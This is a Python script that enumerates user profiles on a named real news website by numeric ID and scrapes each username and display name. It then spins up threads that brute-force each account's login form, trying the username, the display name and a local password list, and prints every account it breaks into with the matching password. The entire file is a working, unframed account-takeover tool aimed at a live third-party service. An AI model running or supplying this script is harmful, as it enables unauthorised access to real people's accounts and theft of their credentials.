import requests
import sys
import threading
import time

def output(entry):
	number = 0
	for item in entry:
		sys.stdout.write(item + " " * ([8, 32, 32, 8][number] - len(item)))
		number += 1
	sys.stdout.write("\n")

def attempt(entry, passwords):
	try:
		for item in [entry[1], entry[2]] + passwords:
			data = {"form_id": "user_login", "name": entry[1], "pass": item}
			response = requests.post("http://zerohedge.com/user/", data).text
			if "/user/password" not in response:
				output(entry + [item])
				exit()
	except Exception as error: time.sleep(1)

def evaluate(number, passwords):
	try:
		entry = [number]
		response = requests.get("http://zerohedge.com/user/" + number).text
		if "Page Not Found" not in response:
			entry.append(response[response.index("canonical") + \
				48:response.index("og:url") - 21])
			entry.append(response[response.index("<title>") + \
				7:response.index(" | Zero Hedge")])
			threading.Thread(target=attempt,
				args=(entry, passwords)).start()
	except Exception as error: pass

def main(passwords):
	output(["Number", "Username", "Title", "Password"])
	number = 0
	while True:
		evaluate(str(number), passwords)
		number += 1

if __name__ == "__main__":
	try:
		file = open("passwords.txt", "r")
		passwords = file.read().split("\n")[:-1]
		main(passwords)
	except KeyboardInterrupt: sys.stdout.write("\nInterrupted.\n")
	finally: file.close()
